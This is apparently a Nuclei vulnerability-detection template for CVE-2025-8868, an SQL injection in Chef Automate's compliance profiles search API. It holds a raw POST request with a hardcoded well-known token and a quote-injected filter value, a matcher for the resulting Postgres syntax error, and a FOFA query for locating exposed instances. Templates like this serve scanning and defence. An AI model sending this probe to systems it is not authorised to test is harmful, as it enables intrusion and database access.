http:
- matchers:
  - condition: and
    dsl:
    - status_code == 500
    - 'contains(body, ''pq: syntax error'')'
    - contains(content_type, 'application/json')
    type: dsl
  raw:
  - 'POST /api/v0/compliance/profiles/search HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506


    {"filters": [{"type": "name''", "values": ["test"]}]}

    '
id: CVE-2025-8868
info:
  author: 3th1c_yuk1,xbow
  classification:
    cve-id: CVE-2025-8868
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.94773
    epss-score: 0.17119
  description: 'In Progress Chef Automate, versions earlier than 4.13.295, on Linux
    x86 platform, an authenticated attacker can gain access to Chef Automate restricted
    functionality in the compliance service via improperly neutralized inputs used
    in an SQL command using a well-known token.

    '
  impact: 'Authenticated attackers with knowledge of a well-known token can execute
    arbitrary SQL queries through the compliance service, potentially gaining access
    to restricted functionality and sensitive data.

    '
  metadata:
    fofa-query: body="Chef Automate"
    max-request: 1
    verified: true
  name: "Chef Automate < 4.13.295 \u2014 SQL Injection"
  reference:
  - https://xbow.com/blog/cooking-an-sql-injection-vulnerability-in-chef-automate
  - https://nvd.nist.gov/vuln/detail/CVE-2025-8868
  remediation: 'Upgrade to version 4.13.295 or later.

    '
  severity: critical
  tags: cve,cve2025,chef,automate,sqli,vkev,vuln
